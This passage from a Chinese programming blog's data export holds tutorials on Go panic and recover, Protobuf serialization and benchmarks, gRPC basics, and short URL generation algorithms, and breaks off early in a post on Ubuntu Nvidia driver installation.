严格来说，在Go里面，错误和异常是2种不同的类型，错误一般是指程序产生的逻辑错误，或者意料之中的意外情况，而且异常一般就是panic，比如角标越界、段错误。 对于错误，Golang采用了一种非常原始的手段，我们必须手动处理可能产生的每一个错误，一般会把错误返回给调用方，下面这种写法在Go里面十分常见： 12345678910111213141516171819package mainimport ( \"errors\" \"fmt\")func main() &#123; s, err := say() if err != nil &#123; fmt.Printf(\"%s\\n\", err.Error()) &#125; else &#123; fmt.Printf(\"%s\\n\", s) &#125;&#125;func say() (string, error) &#123; // do something return \"\", errors.New(\"something error\")&#125; 这种写法最大的问题就是每一个error都需要判断处理，非常繁琐，如果使用try catch机制，我们就可以统一针对多个函数调用可能产生的错误做处理，节省一点代码和时间。不过咱们今天不是来讨论Go的异常错误处理机制的，这里只是简单说一下。 2.panic一般错误都是显示的，程序明确返回的，而异常往往是隐示的，不可预测的，比如下面的代码： 1234567891011121314package mainimport \"fmt\"func main() &#123; fmt.Printf(\"%d\\n\", cal(1,2)) fmt.Printf(\"%d\\n\", cal(5,2)) fmt.Printf(\"%d\\n\", cal(5,0)) //panic: runtime error: integer divide by zero fmt.Printf(\"%d\\n\", cal(9,5))&#125;func cal(a, b int) int &#123; return a / b&#125; 在执行第三个计算的时候会发生一个panic，这种错误会导致程序退出，下面的代码的就无法执行了。当然你可以说这种错误理论上是可以预测的，我们只要在cal函数内部做好处理就行了。 然而实际开发中，会发生panic的地方可能特别多，而且不是这种一眼就能看出来的，在Web服务中，这样的panic会导致整个Web服务挂掉，特别危险。 3.recover虽然没有try catch机制，Go其实有一种类似的recover机制，功能弱了点，用法很简单： 12345678910111213141516171819package mainimport \"fmt\"func main() &#123; fmt.Printf(\"%d\\n\", cal(1, 2)) fmt.Printf(\"%d\\n\", cal(5, 2)) fmt.Printf(\"%d\\n\", cal(5, 0)) fmt.Printf(\"%d\\n\", cal(9, 2))&#125;func cal(a, b int) int &#123; defer func() &#123; if err := recover(); err != nil &#123; fmt.Printf(\"%s\\n\", err) &#125; &#125;() return a / b&#125; 首先，大家得理解defer的作用，简单说defer就类似于面向对象里面的析构函数，在这个函数终止的时候会执行，即使是panic导致的终止。 所以，在cal函数里面每次终止的时候都会检查有没有异常产生，如果产生了我们可以处理，比如说记录日志，这样程序还可以继续执行下去。 4.注意的坑一般defer recover这种机制经常用在常驻进程的应用，比如Web服务，在Go里面，每一个Web请求都会分配一个goroutine去处理，在没有做任何处理的情况下，假如某一个请求发生了panic，就会导致整个服务挂掉，这是不可接受的，所以在Web应用里面必须使用recover保证即使某一个请求发生错误也不影响其它请求。 这里我使用一小段代码模拟一下： 123456789101112131415161718192021222324package mainimport ( \"fmt\")func main() &#123; requests := []int&#123;12, 2, 3, 41, 5, 6, 1, 12, 3, 4, 2, 31&#125; for n := range requests &#123; go run(n) //开启多个协程 &#125; for &#123; select &#123;&#125; &#125;&#125;func run(num int) &#123; //模拟请求错误 if num%5 == 0 &#123; panic(\"请求出错\") &#125; fmt.Printf(\"%d\\n\", num)&#125; 上面这段代码无法完整执行下去，因为其中某一个协程必然会发生panic，从而导致整个应用挂掉，其它协程也停止执行。 解决方法和上面一样，我们只需要在run函数里面加入defer recover，整个程序就会非常健壮，即使发生panic，也会完整的执行下去。 1234567891011func run(num int) &#123; defer func() &#123; if err := recover();err != nil &#123; fmt.Printf(\"%s\\n\", err) &#125; &#125;() if num%5 == 0 &#123; panic(\"请求出错\") &#125; fmt.Printf(\"%d\\n\", num)&#125; 上面的代码只是演示，真正的坑是：如果你在run函数里面又启动了其它协程，这个协程发生的panic是无法被recover的，还是会导致整个进程挂掉,我们改造了一下上面的例子： 123456789101112131415161718func run(num int) &#123; defer func() &#123; if err := recover(); err != nil &#123; fmt.Printf(\"%s\\n\", err) &#125; &#125;() if num%5 == 0 &#123; panic(\"请求出错\") &#125; go myPrint(num)&#125;func myPrint(num int) &#123; if num%4 == 0 &#123; panic(\"请求又出错了\") &#125; fmt.Printf(\"%d\\n\", num)&#125; 我在run函数里面又通过协程的方式调用了另一个函数，而这个函数也会发生panic，你会发现整个程序也挂了，即使run函数有recover也没有任何作用，这意味着我们还需要在myPrint函数里面加入recover。但是如果你不使用协程的方式调用myPrint函数，直接调用的话还是可以捕获recover的。 总结一下就是defer recover这种机制只是针对当前函数和以及直接调用的函数可能产生的panic，它无法处理其调用产生的其它协程的panic，这一点和try catch机制不一样。 理论上讲，所有使用协程的地方都必须做defer recover处理，这样才能保证你的应用万无一失，不过开发中可以根据实际情况而定，对于一些不可能出错的函数加了还影响性能。 Go的Web服务也是一样，默认的recover机制只能捕获一层，如果你在这个请求的处理中又使用了其它协程，那么必须非常慎重，毕竟只要发生一个panic，整个Web服务就会挂掉。 最后，总结一下，Go的异常处理机制虽然没有很多其它语言高效，但是基本上还是能满足需求，目前官方已经在着完善这一点，Go2可能会见到。","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"https://wangbjun.github.io/tags/Golang/"}]},{"title":"Protobuf入门和实战","slug":"golang-protobuf","date":"2019-10-22T09:15:43.000Z","updated":"2020-01-09T04:58:49.507Z","comments":true,"path":"2019/10/22/golang-protobuf/","link":"","permalink":"https://wangbjun.github.io/2019/10/22/golang-protobuf/","excerpt":"1.简介Protobuf（Google Protocol Buffer）是 Google公司内部的混合语言数据标准，目前已经开源，支持多种语言（C++、C#、Go、JS、Java、Python、PHP），它是一种轻便高效的结构化数据存储格式，可以用于结构化数据串行化，或者说序列化。它很适合做数据存储或 RPC 数据交换格式。可用于通讯协议、数据存储等领域的语言无关、平台无关、可扩展的序列化结构数据格式。 说简单点，Protobuf就是类似JSON、XML这样的数据交换格式，当今互联网JSON是最流行的格式了，XML用的也挺多，最初接触到Protobuf是因为gRPC默认使用它作为数据编码，相比于JSON和XML，它更小，更快！","text":"1.简介Protobuf（Google Protocol Buffer）是 Google公司内部的混合语言数据标准，目前已经开源，支持多种语言（C++、C#、Go、JS、Java、Python、PHP），它是一种轻便高效的结构化数据存储格式，可以用于结构化数据串行化，或者说序列化。它很适合做数据存储或 RPC 数据交换格式。可用于通讯协议、数据存储等领域的语言无关、平台无关、可扩展的序列化结构数据格式。 说简单点，Protobuf就是类似JSON、XML这样的数据交换格式，当今互联网JSON是最流行的格式了，XML用的也挺多，最初接触到Protobuf是因为gRPC默认使用它作为数据编码，相比于JSON和XML，它更小，更快！ 举个例子：如果我们想表达一个人名字叫John，年龄是28岁，邮箱是jdoe@gmail.com这样的结构化数据，并且需要在互联网上传输 使用XML表示如下： 12345&lt;person&gt; &lt;name&gt;John&lt;&#x2F;name&gt; &lt;age&gt;28&lt;&#x2F;age&gt; &lt;email&gt;jdoe@example.com&lt;&#x2F;email&gt; &lt;&#x2F;person&gt; 使用JSON表示如下： 12345&#123; name: John, age: 28, email: jdoe@example.com&#125; 使用Protobuf表示如下： 12345message Person &#123; string name &#x3D; 1; int32 age &#x3D; 2; string email &#x3D; 3;&#125; 从可读性和表达能力上看，XML最好，JSON其次，而Protobuf这个其实只是一个DSL，用来定义数据结构和类型，实际生成的数据是二进制的，不可读，但Protobuf追求的是性能和速度，关于它们之间的对比，后面再说，咱们先说用法。 2.安装环境Protobuf的使用比较麻烦，首先需要安装Protobuf的编译工具(Protocol Buffers compiler)，Ubuntu环境下自带编译环境，其它平台可自行安装 12jwang@jwang:~$ protoc --versionlibprotoc 3.8.0 然后还需要安装不同语言的运行环境，具体可以参考github.com/protocolbuffers/Protobuf 3.编写proto文件proto其实是一种DSL语法，这个proto文件最终会使用protoc编译成不同语言的文件，然后在程序里面调用，这也是Protobuf跨平台的关键。关于proto文件的语法这里不详细介绍，建议大家参考官方文档，东西很多，也很详细。 我这里拿一个简单实际的例子（person.proto）来说明一下，建议大家使用Goland安装一个插件，这样有颜色还可以检查语法： 第一行syntax是声明proto语法版本，如果不声明默认是2，建议使用3版本 然后是package也就包，这个影响到最后生成的go文件的包 后面message是用来声明一个数据对象，我觉得可以理解为结构体struct，这个数据对象有自己的数据成员，每个字段有类型和默认值。 proto的数据类型有标量类型和枚举类型，由于不同语言的数据类型不太一样，所以这里的类型和实际语言的类型有一个对应转换关系，具体可以参考官方文档 repeated 相当于声明一个数组，比如在上面的例子，意思就是car是一个string类型的数组 message可以嵌套声明，也可以引用一个类型 最迷惑的东西估计就是后面那个1,2,3,4…了，据官方文档的说法是为了在二进制格式里面标记数据，在每一个message里面必须是唯一的，从最小的1开始，一直可以到2的29次方-1，也就是536870911，但是19000到19999是保留的数字。 基本语法还是挺简单的，不过有些深入的用法这里没有介绍到，想要了解的话务必查看官方文档，不过定义数据结构和类型只是第一步，接下来我们还要使用protoc把这个文件编译成对应语言的文件。 4.编译proto文件以Go语言为例，建议切换到proto文件目录执行命令： 1protoc --go_out&#x3D;. person.proto 其中–go_out表示输出go版本的，其它语言把go替换就行了，比如–php_out、–java_out,=后面是需要输出的目录，我选择.表示当前目录，当然你也可以指定输入和输出目录，最后面则是需要编译的文件，可以指定单个文件，也可以使用通配符同时编译多个文件。 执行完命令之后，你会发现当前目录多了一个person.pb.go文件，这是一个标准的go语法文件，里面主要是一个结构体和一些getter函数，其它的我也不太懂是什么意思就不说了，但是并不影响我们使用。 5.使用以Go为例，我们需要安装一个运行库，其它语言也差不多，官方针对每一个语言都有一个单独的介绍文档，务必查阅一下。 下面是一个完整的案例： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546package mainimport ( \"fmt\" \"github.com/golang/Protobuf/proto\" \"io/ioutil\" \"os\")func main() &#123; //实例化模型对象，填充数据 p := &amp;Person&#123; Id: 1, Name: \"jun\", Age: 25, Money: 24.5, Car: []string&#123;\"car1\", \"car2\"&#125;, Phone: &amp;Person_Phone&#123;Number: \"0551-12323232\", Type: \"1\"&#125;, Sex: Person_female, &#125; //Marshal序列化 out, err := proto.Marshal(p) if err != nil &#123; panic(err) &#125; //序列化得到结果是二进制的，是不可读的，所以这里保存到文件 file, _ := os.OpenFile(\"out\", os.O_CREATE|os.O_WRONLY, 0666) _, _ = file.Write(out) _ = file.Close() //unMarshal还原数据，从文件里面读取 in, _ := os.Open(\"out\") bytes, err := ioutil.ReadAll(in) if err != nil &#123; panic(err) &#125; p1 := &amp;Person&#123;&#125; err = proto.Unmarshal(bytes, p1) if err != nil &#123; panic(err) &#125; //调用string()方法打印，也可以使用其生成的getter函数 fmt.Printf(\"%s\\n\", p1.String()) fmt.Printf(\"%d\\n\", p1.GetId)&#125; 6.与JSON对比由于XML目前很少使用在Web API接口上，所以这里就不对比了，主要看一下和JSON的对比，包含2个方面：速度和大小。 为了测试，我在proto文件里面又加了一个数据对象，表示一个组里面有多个person对象 123message Group &#123; repeated Person person &#x3D; 1;&#125; 分别测试有1,10,100个对象的时候对比情况，测试代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859func BenchmarkProto(b *testing.B) &#123; g :&#x3D; &amp;Group&#123;&#125; for i :&#x3D; 0; i &lt; 100; i++ &#123; p :&#x3D; &amp;Person&#123; Id: int32(i), Name: &quot;测试名称&quot;, Age: int32(25 * i), Money: 240000.5, Car: []string&#123;&quot;car1&quot;, &quot;car2&quot;, &quot;car3&quot;, &quot;car4&quot;, &quot;car5&quot;, &quot;car7&quot;, &quot;car6&quot;, &quot;car21&quot;, &quot;car22&quot;,&#125;, Phone: &amp;Person_Phone&#123;Number: &quot;0551-12323232&quot;, Type: &quot;1&quot;&#125;, Sex: Person_female, &#125; g.Person &#x3D; append(g.Person, p) &#125; b.ResetTimer() b.N &#x3D; 1000 for i :&#x3D; 0; i &lt; b.N; i++ &#123; out, err :&#x3D; proto.Marshal(g) if err !&#x3D; nil &#123; panic(err) &#125; g1 :&#x3D; &amp;Group&#123;&#125; err &#x3D; proto.Unmarshal(out, g1) if err !&#x3D; nil &#123; panic(err) &#125; &#125;&#125;func BenchmarkJson(b *testing.B) &#123; g :&#x3D; &amp;Group&#123;&#125; for i :&#x3D; 0; i &lt; 100; i++ &#123; p :&#x3D; &amp;Person&#123; Id: int32(i), Name: &quot;测试名称&quot;, Age: int32(25 * i), Money: 240000.5, Car: []string&#123;&quot;car1&quot;, &quot;car2&quot;, &quot;car3&quot;, &quot;car4&quot;, &quot;car5&quot;, &quot;car7&quot;, &quot;car6&quot;, &quot;car21&quot;, &quot;car22&quot;,&#125;, Phone: &amp;Person_Phone&#123;Number: &quot;0551-12323232&quot;, Type: &quot;1&quot;&#125;, Sex: Person_female, &#125; g.Person &#x3D; append(g.Person, p) &#125; b.ResetTimer() b.N &#x3D; 1000 for i :&#x3D; 0; i &lt; b.N; i++ &#123; out, err :&#x3D; json.Marshal(g) if err !&#x3D; nil &#123; panic(err) &#125; g1 :&#x3D; &amp;Group&#123;&#125; err &#x3D; json.Unmarshal(out, g1) if err !&#x3D; nil &#123; panic(err) &#125; &#125;&#125; 为了方便对比，指定了测试次数为1000次，测试结果如下： 在1个person的级别： 可以看出，理论上proto明显比json要快不少，每次操作大概是4-5倍差距。后面在10，100个person的级别的测试中，基本上都是保持在4-5倍性能的差距，这个结果也和网上大部分测试结果一致。 关于生成的数据大小，这里也简单测试了一遍，还是上面的例子，我使用了10个person，Protobuf生成的文件大小是1030个byte,json生成的文件大小是1842个byte。 需要注意一点，虽然在大小上Protobuf也领先很多，但是据网上文章介绍，在经过nginx的gzip压缩之后，这2者大小基本上差不多。 7.总结Protobuf作为一种新的数据交换编码方式，虽然使用起来麻烦点，但是在性能和大小上面领先很多，可以用来替换json，使用在一些对性能要求高的场景，比如移动端设备通信。除此之外，目前Protobuf主要用在gRPC用作默认数据编码格式。","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"https://wangbjun.github.io/tags/Golang/"}]},{"title":"GRPC入门和实践","slug":"golang-grpc","date":"2019-08-28T15:15:43.000Z","updated":"2020-01-09T04:58:49.519Z","comments":true,"path":"2019/08/28/golang-grpc/","link":"","permalink":"https://wangbjun.github.io/2019/08/28/golang-grpc/","excerpt":"gPRC首先，先阐述一个误区，很多人以为gRPC只能go语言使用，以为这个g代表的就是go，其实并不是，这个g应该理解成Google，这个rpc框架是Google出品，不过Go对这个框架的支持确实非常好，看一下官网的介绍： gRPC is a modern open source high performance RPC framework that can run in any environment. It can efficiently connect services in and across data centers with pluggable support for load balancing, tracing, health checking and authentication. It is also applicable in last mile of distributed computing to connect devices, mobile applications and browsers to backend services. 详细的介绍可以参考官网（grpc.io）,简单说，gRPC是一个开源的高性能rpc框架。 说到rpc，很多搞微服务的都喜欢用，特别是Java领域，rpc全称 Remote Procedure Call，翻译过来叫远程过程调用，这个翻译并不是特别好理解。","text":"gPRC首先，先阐述一个误区，很多人以为gRPC只能go语言使用，以为这个g代表的就是go，其实并不是，这个g应该理解成Google，这个rpc框架是Google出品，不过Go对这个框架的支持确实非常好，看一下官网的介绍： gRPC is a modern open source high performance RPC framework that can run in any environment. It can efficiently connect services in and across data centers with pluggable support for load balancing, tracing, health checking and authentication. It is also applicable in last mile of distributed computing to connect devices, mobile applications and browsers to backend services. 详细的介绍可以参考官网（grpc.io）,简单说，gRPC是一个开源的高性能rpc框架。 说到rpc，很多搞微服务的都喜欢用，特别是Java领域，rpc全称 Remote Procedure Call，翻译过来叫远程过程调用，这个翻译并不是特别好理解。 举个例子，假设你写了一个算法，非常牛逼，你想把这个算法给别人用，你会咋办？ 首先，得确定这个调用方在哪里？如果这个调用方都在一个项目里面，那我们只需要写个函数，告诉别人函数名字就行了: 1234567package libimport \"fmt\"func Run() &#123; fmt.Println(\"something very NB\")&#125; 但是现实是，这个调用方不是同一个项目的，代码不在一起，是其它项目需要用，咋办呢？ 有人说，把代码copy给别人，比较low，而且有时候代码要保密。 有人说，使用http服务，写个接口出来，扔一个API文档，这个方案完全可以，但是不是今天的主角。 或许，我们也可以使用rpc通信。 Golang RPC不少语言都有自己的rpc框架，比如PHP有phprpc和yar，但是这些rpc框架局限在这个语言，无法做到跨语言之间的调用，而Go也是类似，Go标准库自带的rpc有好几种，默认采用Gob编码，只能在Go语言之间使用,还有一种jsonrpc，采用的是json编码，如果你需要跨语言的话，最好采用gRPC。 Go RPC的函数只有符合下面的条件才能被远程访问： 函数必须是导出的(首字母大写) 必须有两个参数，并且是导出类型或者内建类型 第二个参数必须是指针类型的 函数还要有一个返回值 error 下面看一个简单例子： 入参出参我们首先单独定义了需要被远程调用的方法，以及方法的入参和出参，后面的服务端和客户端都会用到： 123456789101112131415161718192021package golang_rpcimport \"log\"type Add struct &#123;&#125;func (a *Add) Plus(request Request, response *Response) error &#123; response.Result = request.A + request.B log.Printf(\"Add...%d + %d\", request.A, request.B) return nil&#125;type Request struct &#123; A int B int&#125;type Response struct &#123; Result int&#125; Server端这里使用的http协议，其实还有一种tcp的用法，主要作用是注册rpc服务，开启服务。 123456789101112131415161718package mainimport ( . \"gRPC/golang-rpc\" \"log\" \"net/http\" \"net/rpc\")func main() &#123; add := new(Add) _ = rpc.Register(add) rpc.HandleHTTP() log.Println(\"rpc server started at port 8888\") if err := http.ListenAndServe(\":8888\", nil); err != nil &#123; panic(err) &#125;&#125; Client端客户端根据定义的入参结构体拼装好请求参数，调用rpc 123456789101112131415161718192021222324package mainimport ( . \"gRPC/golang-rpc\" \"log\" \"net/rpc\")func main() &#123; dial, err := rpc.DialHTTP(\"tcp\", \":8888\") if err != nil &#123; panic(err) &#125; args := Request&#123; A: 1, B: 2, &#125; var response = Response&#123;&#125; err = dial.Call(\"Add.Plus\", args, &amp;response) if err != nil &#123; panic(err) &#125; log.Printf(\"a = %d, b= %d, result = %d\", args.A, args.B, response.Result)&#125; 这只是展示了Go rpc的一种用法，Go rpc的除了支持tcp之外，还可以使用json，也就是jsonrpc，其编码方式是使用json而不是默认的Gob。 RPC vs HTTP我所参与项目大部分都是基于http，很少使用rpc，原因之一就是因为http特别成熟，文本协议，简单易用，支持广泛，而且其它支持比如负载均衡，流量控制都非常好用。 本质上，这个2种通信方式都可以实现远程过程调用，也就说把数据从一个地方传输到另一个地方（经过处理再返回回来）。当然也有人说http也是rpc的一种实现形式，这些概念性的东西这里就不争论了。 但是rpc确实有一些优点，其中最主要的就是传输效率高，因为http是文本协议，而rpc数据协议往往是二进制。 gRPCgRPC相比于其它rpc语言，目前发展迅速，不仅仅支持多语言（Go、Java、Python、JS），目前也支持Web端，意味着可以在某种程度上替代http了。 先不过多介绍太多理论的东西，这里先结合实际代码来看，默认情况下，gRPC使用Protobuf作为 Interface Definition Language（IDL），所谓IDL就是接口定义语言，说的通俗点就是描述这个服务的结构包括请求参数和响应结果。 这里说到的Protobuf又是什么东西呢？ Protobuf(Google Protocol Buffers)是Google提供一个具有高效的协议数据交换格式工具库(类似Json)，但相比于Json，Protobuf有更高的转化效率，时间效率和空间效率都是JSON的3-5倍。 下面，咱们先看一个demo，先写个helloWorld，gRPC的写法比起http服务确实复杂很多，我们不仅仅要写server端，还要写client端，而http服务的client端一般都有现成的工具（浏览器、curl），但gRPC的client必须是一对一定制化的，需根据IDL生成。 Go的运行环境咱就不说了，目前gRPC要求Go版本在1.6以上 安装gRPC: go get -u google.golang.org/grpc 安装Protobuf v3 compiler，我的Ubuntu系统是自带这个，如果不带的话可以使用apt安装，其它系统可以参考github 安装go的Protobuf插件： go get -u github.com/golang/Protobuf/protoc-gen-go 这个IDL文件并不是Go的语法，只是Protobuf的描述语法，大概的意思相信大部分都能看懂，service 是用来定义服务，然后还定义了请求和响应的参数类型，详细的用法可以参考Protobuf的官方文档。 项目的整理结构如下： 12345678├── client│ └── client.go├── go.mod├── go.sum├── proto│ ├── hello.pb.go│ └── hello.proto└── server.go 切换到终端，在proto目录下执行protoc --go_out=plugins=grpc:. *.proto命令生成一个pb.go文件，这是一个go语法的文件，里面的东西非常多，我们真正用到的就是这个。 下面完成server端的开发： 123456789101112131415161718192021222324252627282930package mainimport ( \"context\" \"fmt\" pb \"gRPC/proto\" \"google.golang.org/grpc\" \"log\" \"net\")type HelloService struct&#123;&#125;func (s *HelloService) Hello(ctx context.Context, r *pb.HelloRequest) (*pb.HelloResponse, error) &#123; fmt.Println(\"new request...\") return &amp;pb.HelloResponse&#123;Response: r.GetRequest() + \" Server\"&#125;, nil&#125;const PORT = \"8080\"func main() &#123; server := grpc.NewServer() pb.RegisterHelloServiceServer(server, &amp;HelloService&#123;&#125;) listen, err := net.Listen(\"tcp\", \":\"+PORT) if err != nil &#123; log.Fatalf(\"net.Listen err: %v\", err) &#125; _ = server.Serve(listen)&#125; server端的主要作用是实现服务定义的接口，然后把服务注册到rpc server里面，最后启动服务等待请求的到来，和http服务有点类似。 虽然服务启动了，但是这时候无法像像http一样使用浏览器或者其它工具去访问，我们必须使用特定的客户端来访问服务，下面是客户端的代码： 12345678910111213141516171819202122232425262728package mainimport ( \"context\" pb \"gRPC/proto\" \"google.golang.org/grpc\" \"log\")const PORT = \"8080\"func main() &#123; conn, err := grpc.Dial(\":\"+PORT, grpc.WithInsecure()) if err != nil &#123; log.Fatalf(\"grpc.Dial err: %v\", err) &#125; defer conn.Close() client := pb.NewHelloServiceClient(conn) resp, err := client.Hello(context.Background(), &amp;pb.HelloRequest&#123; Request: \"Hello gRPC\", &#125;) if err != nil &#123; log.Fatalf(\"client.Search err: %v\", err) &#125; log.Printf(\"resp: %s\", resp.GetResponse())&#125; 最后，先启动server，然后运行client。 有人可能会说，废了这么大劲，到最后结果和http服务有啥区别？我使用http服务分分钟钟搞定的事情，gRPC还需要定义这个那个…但是gRPC的功能不止这些。 流式请求上面的demo只是一个simple模型，类似于http的request和response模型，但是gRPC还支持流式请求，其交互模型包括： 服务端流。客户端发出一个请求，服务端返回一个响应流 客户端流。客户端发出一个请求流，服务端返回一个响应 双向流。客户端和服务端可以互相通信，类似websocket一样 具体的应用场景可以结合业务需求来定，这里demo就不展示了，官方有非常详细的example，其实大部分时候还是使用simple模型比较多。 应用场景目前gRPC已经支持移动端和Web，如果拿来替代http也可行，但是http很容易调试和测试，而gRPC则很难，而且http的通用性更广泛，如果是对外提供的公开API，非http莫属。 目前来说gPRC比较适合用在一些对性能要求高而且比较稳定的场景，比如项目内部微服务之间的通信，这也是大多数rpc框架的主要应用场景。","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Grpc","slug":"Grpc","permalink":"https://wangbjun.github.io/tags/Grpc/"}]},{"title":"短网址原理和实现","slug":"short-url","date":"2019-07-09T11:02:46.000Z","updated":"2020-01-09T05:52:50.111Z","comments":true,"path":"2019/07/09/short-url/","link":"","permalink":"https://wangbjun.github.io/2019/07/09/short-url/","excerpt":"1.背景介绍相信很多人手机上都收到过一些营销短信，短信里面有时候会附带一些网址，如下图这些网址往往都是非常短，但是当我们打开之后，如果你仔细观察，中间会有跳转，最终浏览器地址栏显示的网址并不是你短信里面看到的网址，这就是短网址！","text":"1.背景介绍相信很多人手机上都收到过一些营销短信，短信里面有时候会附带一些网址，如下图这些网址往往都是非常短，但是当我们打开之后，如果你仔细观察，中间会有跳转，最终浏览器地址栏显示的网址并不是你短信里面看到的网址，这就是短网址！ 2.原理和应用短网址一般是采用一个非常短域名下，路径参数一般只有3-6个字符组成，非常简洁！ 使用短网址的前提是先生成短网址，主要是采用某种算法让一段短的字符对应一个长的字符，比如说从常用的0-9、a-z、A-Z共62个字符中选择6个字符，那意味着有62的6次方种组合，大概有568亿不重复的短网址可用！ 服务器通过路径参数查询到真实的长网址，然后使用301/302跳转到真实的网址即可！ 关于跳转，301 是永久重定向，302 是临时重定向。短地址一经生成就不会变化，所以用 301 是符合 http 语义的，浏览器会记录跳转地址，同时对服务器压力也会有一定减少。但是如果使用了 301，我们就无法统计到短地址被点击的次数了，如果对数据统计有要求的话，使用302跳转可能比较好一些！ 短网址的主要好处是方便传输记忆，特别是在短信里面使用的时候，短信对内容字数有限制，还有比如说微博分享也使用了短网址！ 3.市面现有案例目前市面上有很多免费的短链接服务，功能基本上都一样，也没有什么限制！ (1)百度的短链接(https://dwz.cn/)，百度不仅仅提供了网页入口，也提供了接口和开发文档，简单易用！ (2)新浪的短链接(http://sina.lt/)，目前仅提供网页入口，未发现接口服务！ (3)淘宝的短链接(https://tb.am/)，目前仅提供网页入口，未发现接口服务！ 市面还有很多其它的小的公司提供短链接服务，有些是部分免费，有些短链接是有效期的，这里不一一介绍！ 4.常用算法网上比较流行的算法有进制算法、摘要（Hash）算法、随机数算法，下面简单介绍一下： 一.进制算法这个算法网上也有叫作自增序列算法，特点就是永不重复，设置 id 自增，一个 10进制 id 对应一个62进制的数值，1对1，也就不会出现重复的情况，这个利用的就是低进制转化为高进制时，字符数会减少的特性。 计算机中常见的进制有2进制，8进制，10进制，16进制，进制越大，能够表示的数越大，占用的字数也越少。下面举个例： 10进制的1000，在8进制里面是1750，在16进制里面就是3E8，那在62进制里面呢？有人说，计算机里面没有62进制。。。虽然没有，但是我们可以造一个，进制的转换算法是固定的，最常见的就是“除基取余法”！ 我们假设62进制的字符序列为 0-9a-zA-Z，顺序可以打乱，但是应该固定下来，是一个从0角标开始的到61的数组，我们暂且称之为字母表！ ====&gt; 1000/62 = 16，余8 ====&gt; 16/62 = 0，余16 余数得到的数字是16、8，然后找到字母表里面角标为16和8的字符拼起来，就是g8，非常短，只有2位数！假如说我们想至少产生6位字符，那么我们可以从一个比较大的数字开始，具体可以看下图： 1234561位 62 0 - 612位 3844 62 - 38433位 约 23万 3844 - 2383274位 约 1400万 238328 - 147763355位 约 9.1亿 14776336 - 9161328316位 约 568亿 916132832 - 56800235583 二.Hash算法第一种方式：简单的对长链接进行加盐md5，会生成一个32位的字符串，随机从里面取6个字符，或者简单粗暴取最后6位，但是md5只包含0-9A-Fa-f,比字母表的里面字符还少，冲突几率更大！ 第二种方式：1.将长网址 md5 生成 32 位签名串,分为 4 段, 每段 8 个字节 2.对这四段循环处理, 取 8 个字节, 将他看成 16 进制串与 0x3fffffff(30位1) 与操作, 即超过 30 位的忽略处理 3.这 30 位分成 6 段, 每 5 位的数字作为字母表的索引取得特定字符, 依次进行获得 6 位字符串 4.总的 md5 串可以获得 4 个 6 位串,取里面的任意一个就可作为这个长 url 的短 url 地址 生成的方式更加复杂，重复的几率低，但是依然会出现冲突！ 三.随机数算法这个更简单，直接对这个62个字符数组做随机选择，选择其中6个字符当作短链接码，简单易用，但是难免会出现重复冲突！ 四.算法对比第一种算法只要解决自增id问题就可以避免冲突，自增id可以采用数据库自增主键，每次生成短码只需一次数据库操作（insert操作，获取主键id，然后算出短码即可） 第二种和第三种算法其实都差不多，都是依赖于程序随机，容易出现冲突，这就需要每次在插入数据库的时候判重，效率低一些！ 5.安全短链接虽然方便了传输和记忆，但是由于链接组成的字符个数少，更容易被爆破、猜测攻击，攻击者可以轻松遍历所有字符组成的链接！ 所以不建议使用短链接发送具有私密性的网址，比如说重置密码链接，对一些权限、敏感信息的链接要做好二次鉴权！ 最后，推荐一个使用golang写的短网址项目，可以作为一个单独服务部署使用: https://github.com/praglody/shorturl","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"短网址","slug":"短网址","permalink":"https://wangbjun.github.io/tags/%E7%9F%AD%E7%BD%91%E5%9D%80/"}]},{"title":"Ubuntu 下nvidia显卡驱动安装","slug":"ubuntu-nvidia-dirver","date":"2019-07-01T04:11:09.000Z","updated":"2020-01-08T17:44:37.451Z","comments":true,"path":"2019/07/01/ubuntu-nvidia-dirver/","link":"","permalink":"https://wangbjun.github.io/2019/07/01/ubuntu-nvidia-dirver/","excerpt":"Linux下面的显卡驱动一直是个麻烦事，主要是独立显卡，特别是（NVIDIA）英伟达的显卡，气的当年祖师爷怒竖中指，虽然很多年过去了，情况有所改变，但也不是特别好！ 集成显卡如果你在Linux下面不打游戏，也不搞深度学习，强烈建议你卸载独立显卡已提高性能，当然前提是你使用的intel带集显CPU，大部分intel自带集显的性能已经能满足了 Intel对Linux支持很好，所以Linux下面的intel集显驱动非常好，内核自带，不需要额外安装，流畅度也挺高，1080p下面60fps不是问题，但是如果你使用4k显示器，intel集显大部分都是带不动。","text":"Linux下面的显卡驱动一直是个麻烦事，主要是独立显卡，特别是（NVIDIA）英伟达的显卡，气的当年祖师爷怒竖中指，虽然很多年过去了，情况有所改变，但也不是特别好！ 集成显卡如果你在Linux下面不打游戏，也不搞深度学习，强烈建议你卸载独立显卡已提高性能，当然前提是你使用的intel带集显CPU，大部分intel自带集显的性能已经能满足了 Intel对Linux支持很好，所以Linux下面的intel集显驱动非常好，内核自带，不需要额外安装，流畅度也挺高，1080p下面60fps不是问题，但是如果你使用4k显示器，intel集显大部分都是带不动。 至于AMD的APU驱动，本人并没有试过，这里不作任何发言！ 独立显卡如果你使用了一台4k显示器，大部分情况下你需要一个独立显卡，因为集显的话只有部分intel高端CPU和高端主板才能达到4k+60fps的情况（dp线），但是使用独显的话就很容易达到，毕竟集显免费送，独显可是要花钱买的。 虽然Linux自带了一个开源的 nouveau 驱动，但是性能真的堪忧，拿来带4k是不行的，必须安装独显驱动。 现在市场上大部分都是NVIDIA的显卡，我本人使用的也是N卡，至于A卡的情况这里也不作发言，下面说的只针对NVIDIA卡。 手动安装虽然NVIDIA官网提供了最新Linux驱动的下载选项，但是本人并不建议大家尝试手动安装，因为非常麻烦，而且不同发行版不同版本之间可能存在兼容性问题。 